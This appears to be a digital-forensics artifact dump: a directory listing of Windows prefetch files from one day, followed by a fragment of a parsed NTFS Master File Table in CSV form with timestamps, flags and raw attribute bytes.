-rw-rw-r-- 1 fixit42 fixit42  4385 Nov 24 14:04 SVCHOST.EXE-1E5B2E79.pf
-rw-rw-r-- 1 fixit42 fixit42  4844 Nov 24 14:04 SVCHOST.EXE-246B2C11.pf
-rw-rw-r-- 1 fixit42 fixit42  4747 Nov 24 14:08 SVCHOST.EXE-24D9ED88.pf
-rw-rw-r-- 1 fixit42 fixit42  9411 Nov 24 14:09 SVCHOST.EXE-347C0C9B.pf
-rw-rw-r-- 1 fixit42 fixit42  6088 Nov 24 14:10 SVCHOST.EXE-383BACA3.pf
-rw-rw-r-- 1 fixit42 fixit42 10747 Nov 24 12:42 SVCHOST.EXE-3E48EA10.pf
-rw-rw-r-- 1 fixit42 fixit42  7393 Nov 24 12:44 SVCHOST.EXE-40313327.pf
-rw-rw-r-- 1 fixit42 fixit42 12170 Nov 24 13:53 SVCHOST.EXE-41E85177.pf
-rw-rw-r-- 1 fixit42 fixit42  4926 Nov 24 12:42 SVCHOST.EXE-47061DCD.pf
-rw-rw-r-- 1 fixit42 fixit42  4509 Nov 24 12:21 SVCHOST.EXE-52573C87.pf
-rw-rw-r-- 1 fixit42 fixit42  8067 Nov 24 12:43 SVCHOST.EXE-5A210C75.pf
-rw-rw-r-- 1 fixit42 fixit42  5558 Nov 24 12:22 SVCHOST.EXE-5AFA434B.pf
-rw-rw-r-- 1 fixit42 fixit42  5106 Nov 24 13:28 SVCHOST.EXE-5C00D3D5.pf
-rw-rw-r-- 1 fixit42 fixit42  3869 Nov 24 12:42 SVCHOST.EXE-5E7B2DAC.pf
-rw-rw-r-- 1 fixit42 fixit42  3992 Nov 24 12:42 SVCHOST.EXE-6D84FBA7.pf
-rw-rw-r-- 1 fixit42 fixit42 12085 Nov 24 14:33 SVCHOST.EXE-6D9DC76F.pf
-rw-rw-r-- 1 fixit42 fixit42  4059 Nov 24 12:42 SVCHOST.EXE-6DA4EBD4.pf
-rw-rw-r-- 1 fixit42 fixit42  6785 Nov 24 12:47 SVCHOST.EXE-7652BBC1.pf
-rw-rw-r-- 1 fixit42 fixit42  7777 Nov 24 13:21 SVCHOST.EXE-881C0886.pf
-rw-rw-r-- 1 fixit42 fixit42  4150 Nov 24 12:21 SVCHOST.EXE-8DA0BAAD.pf
-rw-rw-r-- 1 fixit42 fixit42  4787 Nov 24 14:36 SVCHOST.EXE-8FD92526.pf
-rw-rw-r-- 1 fixit42 fixit42  5814 Nov 24 13:24 SVCHOST.EXE-93CEEE07.pf
-rw-rw-r-- 1 fixit42 fixit42 10416 Nov 24 12:42 SVCHOST.EXE-93DCE9BF.pf
-rw-rw-r-- 1 fixit42 fixit42  9413 Nov 24 12:49 SVCHOST.EXE-943994C7.pf
-rw-rw-r-- 1 fixit42 fixit42  3950 Nov 24 14:08 SVCHOST.EXE-944F41FA.pf
-rw-rw-r-- 1 fixit42 fixit42  9877 Nov 24 12:46 SVCHOST.EXE-99F99935.pf
-rw-rw-r-- 1 fixit42 fixit42  6516 Nov 24 14:04 SVCHOST.EXE-A2ABF19C.pf
-rw-rw-r-- 1 fixit42 fixit42  4878 Nov 24 12:44 SVCHOST.EXE-A9822852.pf
-rw-rw-r-- 1 fixit42 fixit42  9426 Nov 24 13:20 SVCHOST.EXE-B1BAA501.pf
-rw-rw-r-- 1 fixit42 fixit42  5882 Nov 24 12:42 SVCHOST.EXE-B227FD78.pf
-rw-rw-r-- 1 fixit42 fixit42 10281 Nov 24 13:07 SVCHOST.EXE-BAA85103.pf
-rw-rw-r-- 1 fixit42 fixit42 13774 Nov 24 13:53 SVCHOST.EXE-C157FE85.pf
-rw-rw-r-- 1 fixit42 fixit42  3727 Nov 24 12:54 SVCHOST.EXE-C407FFDC.pf
-rw-rw-r-- 1 fixit42 fixit42  4590 Nov 24 14:37 SVCHOST.EXE-C5371482.pf
-rw-rw-r-- 1 fixit42 fixit42 10223 Nov 24 12:42 SVCHOST.EXE-CACF4584.pf
-rw-rw-r-- 1 fixit42 fixit42 17194 Nov 24 12:53 SVCHOST.EXE-D778BE1D.pf
-rw-rw-r-- 1 fixit42 fixit42  4817 Nov 24 12:44 SVCHOST.EXE-E25434CF.pf
-rw-rw-r-- 1 fixit42 fixit42  4431 Nov 24 14:09 SVCHOST.EXE-E5A7F4DF.pf
-rw-rw-r-- 1 fixit42 fixit42  4834 Nov 24 14:25 SVCHOST.EXE-EF984078.pf
-rw-rw-r-- 1 fixit42 fixit42 15865 Nov 24 14:28 SVCHOST.EXE-F737CE0B.pf
-rw-rw-r-- 1 fixit42 fixit42  5797 Nov 24 13:28 SVCHOST.EXE-FB3B4AD4.pf
-rw-rw-r-- 1 fixit42 fixit42 10133 Nov 24 14:07 SYSTEMPROPERTIESREMOTE.EXE-FF06C471.pf
-rw-rw-r-- 1 fixit42 fixit42 37284 Nov 24 13:14 SYSTEMSETTINGS.EXE-45A5EC0B.pf
-rw-rw-r-- 1 fixit42 fixit42 12052 Nov 24 14:37 TASKHOSTW.EXE-4DB99E1B.pf
-rw-rw-r-- 1 fixit42 fixit42  4865 Nov 24 12:59 TASKKILL.EXE-609E34DE.pf
-rw-rw-r-- 1 fixit42 fixit42  5452 Nov 24 14:36 TASKKILL.EXE-B1536702.pf
-rw-rw-r-- 1 fixit42 fixit42 27690 Nov 24 13:15 TASKMGR.EXE-72398DC0.pf
-rw-rw-r-- 1 fixit42 fixit42 27262 Nov 24 14:32 TIWORKER.EXE-1DF9E9B1.pf
-rw-rw-r-- 1 fixit42 fixit42  5115 Nov 24 14:32 TRUSTEDINSTALLER.EXE-031B6478.pf
-rw-rw-r-- 1 fixit42 fixit42  4938 Nov 24 14:26 TSTHEME.EXE-2786BF6D.pf
-rw-rw-r-- 1 fixit42 fixit42  5545 Nov 24 14:08 UNREGMP2.EXE-F3D7C3D3.pf
-rw-rw-r-- 1 fixit42 fixit42 18536 Nov 24 12:58 UPDATEPLATFORM.AMD64FRE.EXE-1634EC76.pf
-rw-rw-r-- 1 fixit42 fixit42  5056 Nov 24 14:09 VBOXTRAY.EXE-EE6B7F0E.pf
-rw-rw-r-- 1 fixit42 fixit42  3730 Nov 24 14:15 VERCLSID.EXE-4D95F5A7.pf
-rw-rw-r-- 1 fixit42 fixit42  4204 Nov 24 11:55 VSSADMIN.EXE-7135D92C.pf
-rw-rw-r-- 1 fixit42 fixit42  5301 Nov 24 14:36 VSSVC.EXE-04D079CC.pf
-rw-rw-r-- 1 fixit42 fixit42 40535 Nov 24 12:51 WERFAULT.EXE-B7E27BE5.pf
-rw-rw-r-- 1 fixit42 fixit42 12094 Nov 24 12:47 WERMGR.EXE-327A1A07.pf
-rw-rw-r-- 1 fixit42 fixit42  5065 Nov 24 14:36 WEVTUTIL.EXE-C09B744F.pf
-rw-rw-r-- 1 fixit42 fixit42 22409 Nov 24 14:10 WINDOWSINTERNAL.COMPOSABLESHE-EE394D7A.pf
-rw-rw-r-- 1 fixit42 fixit42  3869 Nov 24 14:09 WINDOWS.WARP.JITSERVICE.EXE-576D6110.pf
-rw-rw-r-- 1 fixit42 fixit42  3665 Nov 24 14:20 WINGET.EXE-04985AE6.pf
-rw-rw-r-- 1 fixit42 fixit42  9613 Nov 24 14:08 WINLOGON.EXE-8163EECC.pf
-rw-rw-r-- 1 fixit42 fixit42 14096 Nov 24 14:02 WINSAT.EXE-F927CE81.pf
-rw-rw-r-- 1 fixit42 fixit42  4545 Nov 24 12:43 WMIADAP.EXE-369DF1CD.pf
-rw-rw-r-- 1 fixit42 fixit42 10907 Nov 24 14:19 WMIPRVSE.EXE-43972D0F.pf
-rw-rw-r-- 1 fixit42 fixit42  5897 Nov 24 13:10 WUAUCLT.EXE-830BCC14.pf
-rw-rw-r-- 1 fixit42 fixit42 23706 Nov 24 13:18 YOURPHONE.EXE-66C83BD4.pf

```

```






...

x001\x00.\x00D\x00L\x00L\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00\x00\x00\x01\x00\x00(\x00\x00\x00\x00\x04\x18\x00\x00\x00\x04\x00\x08\x00\x00\x00 \x00\x00\x00$\x00D\x00S\x00C\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x16\x00'}",,,,
86650,Valid,In Use,Directory,4,86646,0,f,,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2025-11-24T13:37:13.116Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,True,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x00'}",,,,
86651,Valid,In Use,Directory,4,86646,0,r,,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2025-11-24T13:37:13.116Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,True,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x00'}",,,,
86653,Valid,In Use,Directory,4,5565,0,AMA54C~1.38,,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2025-11-24T13:36:50.338Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,,,,,True,True,True,False,False,False,False,False,False,False,False,False,True,"[{'type': 16, 'name': '', 'vcn': 0, 'reference': 86653}, {'type': 48, 'name': '', 'vcn': 0, 'reference': 86653}, {'type': 48, 'name': '', 'vcn': 0, 'reference': 115570}, {'type': 144, 'name': '$I30', 'vcn': 0, 'reference': 115570}, {'type': 256, 'name': '$DSC', 'vcn': 0, 'reference': 115570}, {'type': 256, 'name': '$TXF_DATA', 'vcn': 0, 'reference': 86653}]",None,,None,None,None,None,None,None,None,None,"{'size': 19703626332373028, 'data': b'_\x00D\x00A\x00T\x00A\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x05\x00\x01\x00\x00\x00\x01\x00\x00\x00\xb3\r\x00\x00\x00\x00\x00\x00\x00<\x9b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00>\x9b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x0f\x95,\xd9E\xde\xd4\x01\x0f\x95,\xd9E\xde\xd4\x01\x0f\x95,\xd9E\xde\xd4\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x01\x03f\x00\x00\x00\x00\x00\xad\xac\x01\x00\x00\x00\x03\x00h\x00X\x00\x00\x00\x00\x00}R\x01\x00\x00\x00\x04\x00\xcc\xf1,\xd7E\xde\xd4\x01\x8c\xa9<\xd7E\xde\xd4\x01\xdb\x9f\xd2\xfaE\xde\xd4\x01}VA\xd7E\xde\xd4\x01\x00\xa0\x1a\x00\x00\x00\x00\x00\x18\x95\x1a\x00\x00\x00\x00\x00 \x00\x04\x00W\x00\x05\x00\x0b\x03p\x00r\x00o\x00p\x00s\x00y\x00s\x00.\x00d\x00l\x00l\x00\x81R\x01\x00\x00\x00\x04\x00X\x00D\x00\x00\x00\x00\x00}R\x01\x00\x00\x00\x04\x00\x0f\x95,\xd9E\xde\xd4\x01\x0f\x95,\xd9E\xde\xd4\x01\x0f\x95,\xd9E\xde\xd4\x01\x0f\x95,\xd9E\xde\xd4\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x01\x03r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00\x00\x00\x01\x00\x00(\x00\x00\x00\x00\x04\x18\x00\x00\x00\x04\x00\x08\x00\x00\x00 \x00\x00\x00$\x00D\x00S\x00C\x00\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x00'}",,,,
86655,Valid,In Use,Directory,4,86653,0,f,,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2025-11-24T13:37:13.116Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,True,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x00'}",,,,
86657,Valid,In Use,Directory,4,86653,0,r,,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2025-11-24T13:37:13.116Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,2019-03-19T11:21:07.827Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,True,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,"{'size': 18859179926356004, 'data': b'\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00'}",,,,
86658,Valid,In Use,Directory,4,86576,0,metamodel_builder,,2019-03-19T11:30:02.230Z,2019-03-19T11:30:08.087Z,2025-11-24T13:37:58.285Z,2019-03-19T11:30:08.087Z,2019-03-19T11:30:02.230Z,2019-03-19T11:30:02.230Z,2019-03-19T11:30:02.230Z,2019-03-19T11:30:02.230Z,,,,,True,False,True,False,False,False,True,True,True,False,False,False,False,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",{'data_runs_offset': 0},"{'size': 4784164, 'data': b'3\x000\x00\x01\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00{\xb803\x9f\xd1\x01\x00{\xb803\x9f\xd1\x018\xa5\x8c\x18G\xde\xd4\x018\xa5\x8c\x18G\xde\xd4\x01\x00`\x00\x00\x00\x00\x00\x00vW\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x0b\x02B\x00U\x00I\x00L\x00D\x00E\x00~\x001\x00.\x00R\x00B\x00\x83R\x01\x00\x00\x00\x04\x00p\x00Z\x00\x00\x00\x00\x00\x82R\x01\x00\x00\x00\x04\x00<\x18\xb4\x17G\xde\xd4\x01<\x18\xb4\x17G\xde\xd4\x01<\x18\xb4\x17G\xde\xd4\x01o\xf5\x12\x18G\xde\xd4\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x0c\x01i\x00n\x00t\x00e\x00r\x00m\x00e\x00d\x00i\x00a\x00t\x00e\x00\x00\x00\x00\x00\x00\x00\x83R\x01\x00\x00\x00\x04\x00h\x00R\x00\x00\x00\x00\x00\x82R\x01\x00\x00\x00\x04\x00<\x18\xb4\x17G\xde\xd4\x01<\x18\xb4\x17G\xde\xd4\x01<\x18\xb4\x17G\xde\xd4\x01o\xf5\x12\x18G\xde\xd4\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x08\x02I\x00N\x00T\x00E\x00R\x00M\x00~\x001\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00\x00\xff\xff\xff\xff\x82yG\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\x00'}",None,None,None,None,,,,
86659,Valid,In Use,Directory,4,86658,0,intermediate,,2019-03-19T11:30:02.230Z,2019-03-19T11:30:02.852Z,2025-11-24T13:37:58.517Z,2019-03-19T11:30:02.852Z,2019-03-19T11:30:02.230Z,2019-03-19T11:30:02.230Z,2019-03-19T11:30:02.230Z,2019-03-19T11:30:02.230Z,,,,,True,False,True,False,False,False,True,False,False,False,False,False,False,[],None,,None,None,"{'attr_type': 4784164, 'collation_rule': 3145779, 'index_alloc_size': 48, 'clusters_per_index': 1}",None,None,None,None,None,None,,,,
